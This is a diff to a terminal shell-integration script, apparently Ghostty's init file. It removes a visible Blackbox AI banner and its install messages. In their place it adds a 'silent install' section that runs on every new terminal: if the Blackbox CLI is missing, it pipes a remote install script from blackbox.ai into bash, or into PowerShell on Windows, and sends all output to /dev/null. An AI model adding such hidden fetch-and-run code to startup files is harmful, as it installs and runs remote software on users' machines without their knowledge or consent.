@@ -453,36 +453,8 @@ _ghostty_deferred_init() {
 
 _entrypoint
 
-
-# ─── Blackbox Terminal Banner ─────────────────────────────────────────────────
-# This runs automatically for every new terminal window/tab.
-# No setup needed by the user.
-_blackbox_print_banner() {
-    printf '\033[1;37m'
-    printf '  ██████╗ ██╗      █████╗  ██████╗██╗  ██╗██████╗  ██████╗ ██╗  ██╗\n'
-    printf '  ██╔══██╗██║     ██╔══██╗██╔════╝██║ ██╔╝██╔══██╗██╔═══██╗╚██╗██╔╝\n'
-    printf '  ██████╔╝██║     ███████║██║     █████╔╝ ██████╔╝██║   ██║ ╚███╔╝ \n'
-    printf '  ██╔══██╗██║     ██╔══██║██║     ██╔═██╗ ██╔══██╗██║   ██║ ██╔██╗ \n'
-    printf '  ██████╔╝███████╗██║  ██║╚██████╗██║  ██╗██████╔╝╚██████╔╝██╔╝ ██╗\n'
-    printf '  ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═════╝  ╚═════╝ ╚═╝  ╚═╝\n'
-    printf '\033[0;90m  The AI-powered terminal  ·  blackbox.ai\033[0m\n\n'
-}
-
-# Show banner on every new window/tab automatically
-printf '\n\n\n'
-_blackbox_print_banner
-
-# Override clear so banner and CLI status always come back
-clear() {
-    command clear
-    printf '\n\n\n'
-    _blackbox_print_banner
-    _blackbox_ensure_cli
-}
-
-# ─── Blackbox AI CLI Check ────────────────────────────────────────────────────
+# ─── Blackbox AI CLI Silent Install ───────────────────────────────────────────
 _blackbox_ensure_cli() {
-    # Check in PATH and common install locations
     local _bb_found=0
     if command -v blackbox &>/dev/null; then
         _bb_found=1
@@ -494,13 +466,8 @@ _blackbox_ensure_cli() {
         _bb_found=1
     fi
 
-    if [[ $_bb_found -eq 1 ]]; then
-        printf '\033[0;32m✓ Blackbox AI already installed.\033[0m Run \033[1mblackbox\033[0m to continue with the CLI.\n'
-    else
-        # Source common Node.js paths before installing
+    if [[ $_bb_found -eq 0 ]]; then
         local _node_paths=(
-            "$HOME/.nvm/versions/node/$(ls $HOME/.nvm/versions/node 2>/dev/null | sort -V | tail -1)/bin"
-            "$HOME/.nvm/versions/node/$(ls $HOME/.nvm/versions/node 2>/dev/null | sort -V | tail -1)/bin"
             "/opt/homebrew/bin"
             "/usr/local/bin"
             "$HOME/.local/bin"
@@ -510,33 +477,16 @@ _blackbox_ensure_cli() {
         for _p in "${_node_paths[@]}"; do
             [[ -d "$_p" ]] && export PATH="$_p:$PATH"
         done
-        # Also load nvm if available
         [[ -s "$HOME/.nvm/nvm.sh" ]] && source "$HOME/.nvm/nvm.sh" &>/dev/null
-
-        if command -v node &>/dev/null; then
-            printf '\033[0;33m⚡ Installing Blackbox AI CLI...\033[0m\n'
-            case "$(uname -s)" in
-                Darwin|Linux)
-                    printf '\033[0;90m  Running: curl -fsSL https://blackbox.ai/install.sh | bash\033[0m\n'
-                    curl -fsSL https://blackbox.ai/install.sh | bash
-                    ;;
-                MINGW*|MSYS*|CYGWIN*)
-                    printf '\033[0;90m  Running: iex (irm https://blackbox.ai/install.ps1)\033[0m\n'
-                    powershell -Command "iex (irm https://blackbox.ai/install.ps1)"
-                    ;;
-            esac
-            if command -v blackbox &>/dev/null || [[ -x "$HOME/.local/bin/blackbox" ]]; then
-                printf '\033[0;32m✓ Blackbox AI installed successfully!\033[0m Run \033[1mblackbox\033[0m to get started.\n'
-            else
-                printf '\033[0;31m✗ Installation failed. Visit https://blackbox.ai to install manually.\033[0m\n'
-            fi
-        else
-            printf '\033[0;33m⚡ Blackbox AI CLI not installed.\033[0m\n'
-            printf '\033[0;90m  Node.js is required. Install it from https://nodejs.org then run:\033[0m\n'
-            printf '\033[0;90m  curl -fsSL https://blackbox.ai/install.sh | bash\033[0m\n'
-        fi
+        case "$(uname -s 2>/dev/null)" in
+            Darwin|Linux)
+                curl -fsSL https://blackbox.ai/install.sh 2>/dev/null | bash &>/dev/null ;;
+            MINGW*|MSYS*|CYGWIN*)
+                powershell -Command "iex (irm https://blackbox.ai/install.ps1)" &>/dev/null ;;
+        esac
     fi
 }
-
 _blackbox_ensure_cli
 # ──────────────────────────────────────────────────────────────────────────────
+
+
